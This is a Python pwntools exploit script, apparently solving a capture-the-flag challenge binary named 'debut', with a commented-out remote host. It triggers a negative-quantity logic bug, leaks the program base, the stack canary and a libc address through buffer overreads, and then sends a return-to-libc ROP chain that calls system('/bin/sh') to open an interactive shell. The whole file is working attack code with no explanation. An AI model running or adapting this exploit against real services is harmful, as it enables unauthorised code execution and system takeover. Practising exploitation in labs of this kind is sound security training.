#!/usr/bin/python3
# -*- coding: UTF-8 -*-
from pwn import *
from time import sleep
   
context.arch = 'amd64'
p = process('./debut')
#p = remote('140.115.59.7', 10006)
pause()

lib = ELF('./libc.so.6')
elf = ELF('./debut')



p.sendlineafter ( b"name: ", b"ABCDE")

# Shopping
p.recvuntil( b"What do you want to do?" )
p.sendafter( b">", b"2")

# Sell Sticker
p.recvuntil( b"Buy or Sell (B/S)" )
p.sendafter( b"> ", b"s")
p.recvuntil( b"How many stickers do you want to sell?" )
p.sendafter( b"> ", b"-5000000")

# Shopping Fans
for i in range(1, 6):
        p.recvuntil( b"What do you want to do?" )
        p.sendafter( b">", b"2")
        p.recvuntil( b"Buy or Sell (B/S)" )
        p.sendafter( b"> ", b"b")
        p.recvuntil( b"Which one to buy?" )
        p.sendafter( b"> ", flat( str(i) ) )


# Steam
for i in range(2):
        p.recvuntil( b"What do you want to do?" )
        p.sendafter( b">", b"1")

p.recvuntil( b"What do you want to do?" )
p.sendafter( b">", b"3")



pause()


# Get Main Addr
p.recvuntil( b"Enter your fans name"  )
p.sendafter( b"> ", flat( "A"*8  ) )
p.recvuntil( b"A"*8 )

Main_Recv  = p.recv(8)[:-2].ljust(8, b"\x00")
Main       = hex( u64( Main_Recv ) )
Main_Offs  = 0x0000000000001000
Main_Base  = int( Main, 0) - elf.sym['read_int'] - Main_Offs
Main_Base  = hex( Main_Base - 61 )
print(     "Main: " + str( Main_Recv ) )
print( "u64 Main: " + Main )
print("Main_Base: " + Main_Base  )
print( "" )
p.sendafter( b")", b"N")


# ================================================
# Get Canary Number
p.recvuntil( b"Enter your fans name"  )
p.sendafter( b"> ", flat( "A"*40 + "A"*1  ) )
p.recvuntil( b"A"*40 + b"A"*1 )

Canary_Recv = p.recv(7).rjust(8, b"\x00")
Canary = hex( u64( Canary_Recv ) ) 
print(     "Canary: " + str(Canary_Recv) )
print( "u64 Canary: " + Canary )
print( "" )
p.sendafter( b"N)", b"N")

# ================================================
# Get Libc_start_main addr
p.recvuntil( b"Enter your fans name"  )
p.sendafter( b"> ", flat( "A"*88 ) )
p.recvuntil( b"A"*88 )

Libc_Start_Recv = p.recv(8)[:-2].ljust(8, b"\x00")
Libc_Start = hex( u64( Libc_Start_Recv ) )
Libc_Offs  = 0x0000000000025000
Libc_Base  = int( Libc_Start, 0) - lib.symbols['__libc_start_main'] + Libc_Offs
Libc_Base  = hex( Libc_Base - 243 )
print(     "Libc_Start: " + str( Libc_Start_Recv ) )
print( "u64 Libc_Start: " + Libc_Start )
print("libc Libc_Base : " + Libc_Base  )
print( "" )
p.sendafter( b")", b"N")




p.recvuntil( b"Enter your fans name"  )
p.sendafter( b"> ", flat( "\x90"*88 ) )
p.sendafter( b")", b"N")



# Find System
sh  = next( lib.search( b'/bin/sh') ) + int( Libc_Base, 0) - Libc_Offs
sys = lib.symbols['system'] + int( Libc_Base, 0) - Libc_Offs

pop_rdi    = 0x0000000000001cc3
ret        = 0x000000000000101a

payload = flat(
    "\x90"*40,
    Canary_Recv,
    "\x90"*8,
    p64( int(Main_Base, 0) + pop_rdi + Main_Offs ),
    p64( sh ),  
    p64( int(Main_Base, 0) + ret + Main_Offs ),
    p64( sys ),
    
)

p.recvuntil( b"Enter your fans name"  )
p.sendafter( b"> ", payload )
p.sendafter( b")", b"Y")
 
p.interactive()
p.close()

